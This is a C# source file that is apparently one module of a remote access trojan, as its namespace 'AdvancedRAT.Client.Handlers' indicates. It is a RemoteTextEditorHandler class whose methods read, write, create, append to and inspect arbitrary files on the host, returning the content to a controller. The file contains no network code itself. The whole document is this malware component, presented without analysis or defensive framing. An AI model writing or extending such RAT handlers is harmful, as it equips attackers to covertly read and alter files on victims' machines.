using System;
using System.IO;
using System.Threading.Tasks;
using System.Text;
using System.Linq;

namespace AdvancedRAT.Client.Handlers
{
    public class RemoteTextEditorHandler
    {
        public async Task<object> OpenFile(string path)
        {
            try
            {
                if (!File.Exists(path))
                {
                    return new { success = false, message = "File not found" };
                }
                
                string content = await File.ReadAllTextAsync(path);
                var fileInfo = new FileInfo(path);
                
                return new 
                { 
                    success = true, 
                    path, 
                    content,
                    size = fileInfo.Length,
                    lastModified = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"),
                    encoding = "UTF-8"
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> SaveFile(string path, string content)
        {
            try
            {
                // 백업 생성
                if (File.Exists(path))
                {
                    string backupPath = path + ".bak";
                    File.Copy(path, backupPath, true);
                }
                
                await File.WriteAllTextAsync(path, content, Encoding.UTF8);
                
                var fileInfo = new FileInfo(path);
                
                return new 
                { 
                    success = true, 
                    message = "File saved successfully",
                    path,
                    size = fileInfo.Length,
                    lastModified = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> ReadFile(string path, int startLine = 0, int lineCount = -1)
        {
            try
            {
                if (!File.Exists(path))
                {
                    return new { success = false, message = "File not found" };
                }
                
                var lines = await File.ReadAllLinesAsync(path);
                
                if (lineCount == -1)
                {
                    lineCount = lines.Length - startLine;
                }
                
                var selectedLines = lines.Skip(startLine).Take(lineCount).ToArray();
                string content = string.Join(Environment.NewLine, selectedLines);
                
                return new 
                { 
                    success = true, 
                    path,
                    content,
                    totalLines = lines.Length,
                    startLine,
                    lineCount = selectedLines.Length
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> CreateFile(string path, string content = "")
        {
            try
            {
                if (File.Exists(path))
                {
                    return new { success = false, message = "File already exists" };
                }
                
                await File.WriteAllTextAsync(path, content, Encoding.UTF8);
                
                var fileInfo = new FileInfo(path);
                
                return new 
                { 
                    success = true, 
                    message = "File created successfully",
                    path,
                    size = fileInfo.Length
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> AppendFile(string path, string content)
        {
            try
            {
                if (!File.Exists(path))
                {
                    return new { success = false, message = "File not found" };
                }
                
                await File.AppendAllTextAsync(path, content, Encoding.UTF8);
                
                var fileInfo = new FileInfo(path);
                
                return new 
                { 
                    success = true, 
                    message = "Content appended successfully",
                    path,
                    size = fileInfo.Length
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetFileInfo(string path)
        {
            try
            {
                if (!File.Exists(path))
                {
                    return new { success = false, message = "File not found" };
                }
                
                var fileInfo = new FileInfo(path);
                var lines = await File.ReadAllLinesAsync(path);
                
                return new 
                { 
                    success = true,
                    path = fileInfo.FullName,
                    name = fileInfo.Name,
                    size = fileInfo.Length,
                    created = fileInfo.CreationTime.ToString("yyyy-MM-dd HH:mm:ss"),
                    modified = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"),
                    accessed = fileInfo.LastAccessTime.ToString("yyyy-MM-dd HH:mm:ss"),
                    attributes = fileInfo.Attributes.ToString(),
                    extension = fileInfo.Extension,
                    lineCount = lines.Length,
                    isReadOnly = fileInfo.IsReadOnly
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
